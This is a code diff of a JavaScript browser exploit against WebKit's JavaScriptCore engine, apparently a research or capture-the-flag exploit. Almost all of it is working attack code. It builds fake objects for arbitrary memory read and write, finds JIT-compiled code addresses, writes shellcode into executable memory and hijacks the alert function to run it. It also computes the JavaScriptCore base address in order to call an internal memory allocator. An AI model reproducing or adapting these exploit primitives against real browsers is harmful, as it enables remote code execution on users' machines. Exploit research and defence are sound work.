@@ -263,16 +263,31 @@ Int64.JSC_as_JSValue = (a) => {
     return res;
 }
 
-function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
-    let rwObj;
-    let rwObjBufferAddr;
-    let fakeRwObj;
-    let fakeInnerObj;
+class FakeStuffs {
+    constructor(addrOf, fakeObj, leaked_header) {
+        this.rwObj = {
+            _: 1.1,
+            length: Int64.JSC_as_JSValue(0x4141414141414141),
+            id: Int64.JSC_as_JSValue(leaked_header),
+            butterfly: 1.1,
 
-    function read64(addr) {
+            __: 1.1,
+            innerLength: Int64.JSC_as_JSValue(0x4141414141414141),
+            innerId: Int64.JSC_as_JSValue(leaked_header),
+            innerButterfly: 1.1,
+        };
+
+        this.rwObjBufferAddr = Int64.add(addrOf(this.rwObj), 0x20);
+        this.fakeRwObj = fakeObj(this.rwObjBufferAddr);   
+        this.rwObj.butterfly = this.fakeRwObj;
+        this.fakeInnerObj = fakeObj(Int64.add(this.rwObjBufferAddr, 0x20));
+        this.rwObj.innerButterfly = this.fakeInnerObj;
+    }
+
+    read64(addr) {
         for (let i = 0; i < 0x1000; i++) {
-            fakeRwObj[5] = Int64.to_double(Int64.sub(addr, 8 * i));
-            let value = fakeInnerObj[i];
+            this.fakeRwObj[5] = Int64.to_double(Int64.sub(addr, 8 * i));
+            let value = this.fakeInnerObj[i];
             if (value) {
                 return Int64.from_double(value);
             }
@@ -280,10 +295,15 @@ function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
         throw '[-] Failed to read: ' + addr;
     }
 
-    function write64(addr, value) {
-        fakeRwObj[5] = Int64.to_double(addr);
-        fakeInnerObj[0] = Int64.to_double(value);
+    write64(addr, value) {
+        this.fakeRwObj[5] = Int64.to_double(addr);
+        this.fakeInnerObj[0] = Int64.to_double(value);
     }
+};
+
+function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
+
+    let fake_stuffs = new FakeStuffs(addrOf, fakeObj, leaked_header);
 
     function makeJITCompiledFunction() {
         var obj = {};
@@ -372,23 +392,23 @@ function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
         
     function getJITCodeAddr(func) {
         let funcAddr = addrOf(func);
-        let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
+        let executableAddr = fake_stuffs.read64(Int64.add(funcAddr, 3 * 8));
 
-        let jitCodeAddr = read64(Int64.add(executableAddr, 3 * 8));
+        let jitCodeAddr = fake_stuffs.read64(Int64.add(executableAddr, 3 * 8));
 
         if (Int64.and(jitCodeAddr, new Int64('0xFFFF800000000000')).toString() != '0x0000000000000000' ||
             Int64.and(Int64.sub(jitCodeAddr, new Int64('0x100000000')), new Int64('0x8000000000000000')).toString() != '0x0000000000000000') {
-            jitCodeAddr = Int64.add(Int64.shiftLeft(read64(Int64.add(executableAddr, 3 * 8 + 1)), 1), 0x100);
+            jitCodeAddr = Int64.add(Int64.shiftLeft(fake_stuffs.read64(Int64.add(executableAddr, 3 * 8 + 1)), 1), 0x100);
         }
 
         return jitCodeAddr;
     }
 
     function setJITCodeAddr(func, addr) {
-        let funcAddr = addrOf(func);
-        let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
-        write64(Int64.add(executableAddr, 3 * 8), addr);
-        document.leakAddr(func);
+        let funcAddr = fake_stuffs.addrOf(func);
+        let executableAddr = fake_stuffs.read64(Int64.add(funcAddr, 3 * 8));
+        fake_stuffs.write64(Int64.add(executableAddr, 3 * 8), addr);
+        // document.leakAddr(func);
     }
 
     function getJITFunction() {
@@ -398,29 +418,32 @@ function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
         return [shellcodeFunc, jitCodeAddr];
     }
 
-
-    rwObj = {
-        _: 1.1,
-        length: Int64.JSC_as_JSValue(0x4141414141414141),
-        id: Int64.JSC_as_JSValue(leaked_header),
-        butterfly: 1.1,
-
-        __: 1.1,
-        innerLength: Int64.JSC_as_JSValue(0x4141414141414141),
-        innerId: Int64.JSC_as_JSValue(leaked_header),
-        innerButterfly: 1.1,
-    };
-
-    rwObjBufferAddr = Int64.add(addrOf(rwObj), 0x20);
-    fakeRwObj = fakeObj(rwObjBufferAddr);   
-    rwObj.butterfly = fakeRwObj;
-    fakeInnerObj = fakeObj(Int64.add(rwObjBufferAddr, 0x20));
-    rwObj.innerButterfly = fakeInnerObj;
-
     var [_JITFunc, rwxMemAddr] = getJITFunction();
 
     for (let i = 0; i < sc.length; i++)
-        write64(Int64.add(rwxMemAddr, i), new Int64(sc[i]));
+        fake_stuffs.write64(Int64.add(rwxMemAddr, i), new Int64(sc[i]));
     setJITCodeAddr(alert, rwxMemAddr);
 
+}
+
+function mmap(addrOf, fakeObj, leaked_header) {
+    let fake_stuffs = new FakeStuffs(addrOf, fakeObj, leaked_header);
+
+    let window_proxy = addrOf(window);
+    let window_ptr = fake_stuffs.read64(Int64.add(window_proxy, 0x10));
+    let m_rangeErrorStructure = fake_stuffs.read64(Int64.add(window_ptr, 0x90));
+    let JavaScriptCore = Int64.sub(m_rangeErrorStructure, 0x106fcd1);
+
+    let tmp1 = {};
+    // ExecutableAllocator::allocate
+    let ExecutableAllocator_allocate = Int64.add(JavaScriptCore, 0x000000000090c3f8);
+    let tmp2 = {};
+
+    let funcAddr = addrOf(alert);
+    let executableAddr = fake_stuffs.read64(Int64.add(funcAddr, 3 * 8));
+    fake_stuffs.write64(Int64.add(executableAddr, 3 * 8), ExecutableAllocator_allocate);
+
+    document.leakAddr(tmp1);
+    document.leakAddr(tmp2);
+    let mem_addr = alert(tmp1, 1337, 0);
 }
